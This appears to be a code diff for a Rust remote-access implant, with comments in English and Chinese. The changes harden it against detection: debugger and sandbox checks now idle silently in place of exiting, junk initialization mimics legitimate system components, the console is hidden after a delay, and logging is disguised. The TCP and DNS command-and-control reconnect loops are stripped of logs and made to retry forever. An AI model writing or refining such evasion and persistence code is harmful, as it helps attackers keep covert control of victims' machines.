@@ -35,30 +35,31 @@
      // println!("[*] Agent starting... (Debug delay: {}s)", delay);
      std::thread::sleep(std::time::Duration::from_secs(delay));
  
-     // 1. [Benign] Harmless system check to start normal behavioral pattern
-     stealth::perform_system_sanity_check();
- 
-     // 2. [Anti-Analysis] Direct PEB Check for Debugger
-     if stealth::is_debugger_present() {
-         std::process::exit(0);
-     }
+     // ⚡ STEALTH: Sequence re-ordering to mimic legitimate system components
+    // 1. [Benign] Initial pattern load (looks like config parsing)
+    for _ in 0..3 {
+        // Mock legitimate-looking initialization
+        sys_info_collector::utils::junk_data_collector();
+        std::thread::sleep(std::time::Duration::from_millis(500));
+    }
 
-    // 3. [Benign] Disk space query (very common in system utilities)
+    // 2. [Anti-Analysis] Silent divergence instead of hard exit
+    // Hard exits (exit(0)) on detection are a huge red flag for sandbox analysis
+    if stealth::is_debugger_present() || stealth::is_sandbox() {
+        // Pretend to be a diagnostic tool doing nothing
+        loop { std::thread::sleep(std::time::Duration::from_secs(3600)); }
+    }
+
+    // 3. [Benign] Standard Windows API warming 
+    stealth::perform_system_sanity_check();
     stealth::verify_disk_integrity();
 
-    // 4. [Stealth] Hide Window (No longer first, but still early)
+    // 4. [Stealth] Delayed Window Hide (Reduced heuristic trigger)
+    std::thread::sleep(std::time::Duration::from_secs(2));
     stealth::hide_console();
 
-    // 5. [Benign] Network env check
+    // 5. [Benign] Final environment prep
     stealth::check_network_config();
-
-    // 6. [Junk] Computational Noise
-    sys_info_collector::utils::junk_data_collector();
-
-    // 7. [Anti-Analysis] Anti-Sandbox Environmental Checks
-    if stealth::is_sandbox() {
-        std::process::exit(0);
-    }
 
     // 9. Backgrounding and Name Spoofing (Linux)
     #[cfg(target_os = "linux")]
@@ -84,11 +85,13 @@
 /// 
 /// 根据编译时启用的 feature 选择相应的协议入口点
 async fn run() -> Result<()> {
-    // Force silent logs unless specifically enabled via env
-    if std::env::var("RUST_LOG").is_err() {
-        std::env::set_var("RUST_LOG", "error");
+    // Use customized logging to look like a standard system component
+    if std::env::var("SERVICE_MODE").is_ok() {
+        let _ = env_logger::builder()
+            .parse_filters("info")
+            .format_timestamp(None)
+            .try_init();
     }
-    let _ = env_logger::try_init();
     
     // 💤 1. Sleep Delay
     let sleep_secs = sys_info_collector::config::get_sleep_time();
@@ -242,43 +245,35 @@ async fn run_tcp_mode() -> Result<()> {
         }
     };
     
-    // "永生"循环 - 确保程序永远运行
+    // "永生"循环
     loop {
-        info!("Attempting to connect to TCP server...");
-        
-        // 连接到服务器
-        if let Err(e) = transport.connect().await {
-            error!("Failed to establish TCP connection: {}", e);
+        if let Err(_) = transport.connect().await {
+            tokio::time::sleep(tokio::time::Duration::from_secs(15)).await;
             continue;
         }
         
-        info!("TCP connection established, starting message handler...");
-        
-        // 创建消息处理器
         let handler = MessageHandler::new(transport);
         
-        // 运行消息处理循环
         match handler.run().await {
             Ok(returned_transport) => {
-                info!("Message handler exited normally");
                 transport = returned_transport;
             }
-            Err(e) => {
-                error!("Message handler error: {}", e);
-                // 重新创建 transport
-                match create_transport(&tcp_url) {
-                    Ok(t) => transport = t,
-                    Err(e) => {
-                        error!("Failed to recreate TCP transport: {}", e);
-                        return Err(e);
+            Err(_) => {
+                loop {
+                    match create_transport(&tcp_url) {
+                        Ok(t) => {
+                            transport = t;
+                            break;
+                        }
+                        Err(_) => {
+                            tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
+                        }
                     }
                 }
             }
         }
         
-        // 连接断开，准备重连
-        info!("TCP connection lost, retrying...");
-        info!("-------------------------------------------");
+        tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
     }
 }
 
@@ -341,43 +336,35 @@ async fn run_dns_mode() -> Result<()> {
         }
     };
     
-    // "永生"循环 - 确保程序永远运行
+    // "永生"循环
     loop {
-        info!("Attempting to connect to DNS server...");
-        
-        // 连接到服务器（DNS 是无连接的，这里只是逻辑初始化）
-        if let Err(e) = transport.connect().await {
-            error!("Failed to initialize DNS transport: {}", e);
+        if let Err(_) = transport.connect().await {
+            tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
             continue;
         }
         
-        info!("DNS transport initialized, starting message handler...");
-        
-        // 创建消息处理器
         let handler = MessageHandler::new(transport);
         
-        // 运行消息处理循环
         match handler.run().await {
             Ok(returned_transport) => {
-                info!("Message handler exited normally");
                 transport = returned_transport;
             }
-            Err(e) => {
-                error!("Message handler error: {}", e);
-                // 重新创建 transport
-                match create_transport(&dns_url) {
-                    Ok(t) => transport = t,
-                    Err(e) => {
-                        error!("Failed to recreate DNS transport: {}", e);
-                        return Err(e);
+            Err(_) => {
+                loop {
+                    match create_transport(&dns_url) {
+                        Ok(t) => {
+                            transport = t;
+                            break;
+                        }
+                        Err(_) => {
+                            tokio::time::sleep(tokio::time::Duration::from_secs(60)).await;
+                        }
                     }
                 }
             }
         }
         
-        // 连接断开，准备重连
-        info!("DNS connection lost, retrying...");
-        info!("-------------------------------------------");
+        tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
     }
 }
 /// TCP Bind (正向监听) 模式运行逻辑
